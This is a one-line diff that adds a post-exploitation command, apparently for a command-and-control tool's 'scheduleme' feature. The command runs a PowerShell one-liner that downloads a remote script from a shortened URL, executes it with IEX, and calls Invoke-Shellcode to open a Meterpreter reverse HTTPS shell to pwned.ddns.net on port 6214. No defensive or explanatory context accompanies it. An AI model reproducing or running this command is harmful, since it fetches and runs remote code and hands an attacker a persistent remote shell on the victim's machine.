@@ -1,0 +1,1 @@
+run scheduleme -c "powershell saps powershell -ArgumentList \\\\"\\\"IEX\ (New-Object\ Net.WebClient).DownloadString($([char]39)http://bit.ly/2iGZxUC$([char]39));Invoke-Shellcode\ -Payload\ windows/meterpreter/reverse_https\ -Lhost\ pwned.ddns.net\ -Lport\ 6214\ -Force\\\\"\\\"" -m 10
